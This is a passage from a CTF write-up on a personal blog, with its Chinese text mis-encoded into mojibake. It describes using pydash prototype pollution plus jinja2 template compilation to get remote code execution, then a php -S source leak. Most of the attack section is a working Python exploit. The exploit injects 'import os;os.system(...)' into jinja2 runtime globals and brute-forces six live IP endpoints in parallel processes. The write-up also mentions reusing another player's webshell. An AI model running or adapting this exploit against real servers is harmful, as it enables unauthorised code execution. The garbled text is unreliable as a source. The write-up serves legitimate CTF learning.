<p>è¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“</p>
<p><a href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/</a></p>
<p>wafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2</p>
<p>æˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†<code>__loader__</code>ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†</p>
<p>é‚£æˆ‘ä»¬åªèƒ½ç”¨<code>__spec__</code>æ¥ä»£æ›¿<code>__loader__</code>æ¥è·å–åˆ°sysæ¨¡å—</p>
<p>å› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š</p>
<p>exp</p>
<pre tabindex="0"><code>import requests
import multiprocessing
js = {
    &#34;key&#34;: &#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&#34;,
    &#34;value&#34;: &#34;*;import os;os.system(&#39;/read\\x66lag &gt; /tmp/f&#39;)&#34;}

def brute(url):
    while True:
        try:
            res = requests.post(url + &#34;/Admin?pass=SUers&#34;, json=js)
            print(url + &#34;:&#34; + res.text)
            requests.get(url + &#34;/Admin?pass=SUers&#34;)
            requests.get(url + &#34;/&#34;)
            requests.get(url + &#34;/login&#34;)
            requests.get(url + &#34;/register&#34;)
        except Exception as e:
            print(e)

if __name__ == &#39;__main__&#39;:
    urls=[&#34;http://27.25.151.48:10000&#34;,
         &#34;http://27.25.151.48:10001&#34;,
         &#34;http://27.25.151.48:10002&#34;,
         &#34;http://27.25.151.48:10003&#34;,
         &#34;http://27.25.151.48:10004&#34;,
         &#34;http://27.25.151.48:10005&#34;]
    for url in urls:
        p = multiprocessing.Process(target=brute, args=(url,))
        p.start()
</code></pre><h2 id="su_photogallery">SU_photogallery</h2>
<p>ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡<code>php -S</code>å¼€å¯çš„</p>
<p>å†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç </p>
<p><a href="https://cloud.tencent.com/developer/article/2235691">https://cloud.tencent.com/developer/article/2235691</a></p>
<p>æ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç </p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119002351188.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119002351188.png" alt="image-20250119002351188"  />
</a>
</div>

</p>
<p>åç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119002449472.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119002449472.png" alt="image-20250119002449472"  />
</a>
</div>

</p>

        </div>
    </div>
    <a href="#" id="scrollToTopButton">
        <svg t="1686753152588" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"
            p-id="3988" width="48" height="48">
            <path
                d="M518.5 360.3c-3.2-4.4-9.7-4.4-12.9 0l-178 246c-3.8 5.3 0 12.7 6.5 12.7H381c10.2 0 19.9-4.9 25.9-13.2L512 460.4l105.2 145.4c6 8.3 15.6 13.2 25.9 13.2H690c6.5 0 10.3-7.4 6.5-12.7l-178-246z"
                p-id="3989" fill="#363636"></path>
            <path
                d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64z m0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"
                p-id="3990" fill="#363636"></path>
        </svg>
    </a>

<div class="pp-container">
        <section class="pre-and-post">
            <div class="has-text-left">
                
                <p>Previous post</p>
                <a href="http://localhost:1313/post/d3ctf2025/">D3CTF 2025-WP</a>
                
            </div>
            <div class="has-text-right">
                
                <p>Next post</p>
                <a href="http://localhost:1313/post/jdk17%E6%89%93jackson&#43;ldapattruibute%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">JDK17æ‰“Jackson&#43;LdapAttruibuteååºåˆ—åŒ–</a>
                
            </div>
        </section>
    </div>

</div>

        </main><footer class="footer">
    <div class="content has-text-centered">
    <span>&copy; 2025 <a href="http://localhost:1313/">GSBP&#39;s Blog</a></span>
    
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
    
    <span>
        Powered by
        <a href="https://gohugo.io/" target="_blank">Hugo</a> &
        <a href="https://github.com/hotjuicew/hugo-JuiceBar" target="_blank">JuiceBar</a>
    </span>
    </div>
  </footer>
</body>
</html>

